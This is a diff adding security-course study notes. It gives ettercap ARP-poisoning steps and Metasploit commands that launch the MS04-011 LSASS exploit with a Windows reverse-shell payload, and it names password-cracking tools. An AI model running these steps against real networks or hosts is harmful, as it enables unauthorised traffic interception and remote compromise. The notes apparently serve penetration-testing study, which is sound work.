@@ -188,13 +188,71 @@ HTTPrint -> web server fingerprinting tool
 `may want to look at Nikto too`
 
 ### Exploitation
+**ARP Spoofing**
+- Before using ettercap
+    - `route -n` to get internet gateway IP address
+
+- Start ettercap
+```
+ettercap -G
+```
+- ettercap usage
+    - Scan for host `Host -> scan for hosts`
+    - `-> hosts list`
+        - add target IP as target 1 & internet gateway IP as target 2
+    - `-> Current Targets` 
+        - to confirm targets
+    - `Start -> Start Sniffing`
+    - `MITM -> ARP poisoning`
+        - check `Sniff remote connections`
+    - `View -> Connections`
+        - see active connections
+    - DONT FORGET TO STOP MITM ATTACK
+
+- ARP flush
+```
+arp -d 192.168.1.1
+```
+
+**SSL Man-In-The-Middle(MITM)**
+Burpsuite
+- Refer to book :? (Green Highlight)
+
+**Web Application Exercise**
+Burpsuite
+- Refer to book :? (Green Highlight)
+
+**Metasploit Framework**
+- Run Metasploit (in directory)
+```
+msfconsole.exe
+```
+- In Metasploit
+    - `show exploits` to show exploits
+    - `use windows/smb/ms04_011_lsass` to pick exploit `MS04_011_Lsass` 
+    - `show options` set params for exploit
+    - `set RHOST <ipaddr>` set target ip
+        - `set TARGET 0`
+    - `show payloads` to show payloads
+        - `set payload windows/shell_reverse_tcp` to set reverse shell payload
+    - `exploit` to run exploit
+
+**Password_cracking**
+
+- Use OPHCrack/ John the Ripper
 
 ### Embedding
+**Backdooor Deployment**
 
 ### Egress
 
 ## Part 6: Wireless Insecurity
-
+```
+no commands to take note of
+```
 ## Part 7: Incident Response & Computer Forensics
 
 ## Part 8: The Impact of Law
+```
+no commands to take note of
+```
